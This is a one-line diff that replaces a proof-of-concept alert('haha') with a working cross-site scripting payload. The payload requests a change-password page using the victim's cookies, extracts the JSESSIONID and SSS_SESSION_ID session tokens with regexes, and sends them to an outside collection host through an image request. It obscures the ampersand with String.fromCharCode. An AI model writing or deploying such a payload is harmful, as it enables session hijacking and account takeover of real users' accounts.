@@ -1,1 +1,1 @@
-alert("haha")
+fetch('/ats/change_password?op=edit'+String.fromCharCode(38)+'USER_ID=z',{credentials:'include'}).then(r=>r.text()).then(t=>{var c=(t.match(/JSESSIONID=[A-F0-9]+/i)||[])[0],s=(t.match(/SSS_SESSION_ID=[a-f0-9-]+/i)||[])[0];new Image().src='https://q9fpgq7v.instances.httpworkbench.com/c?'+encodeURIComponent(c+';'+s)})
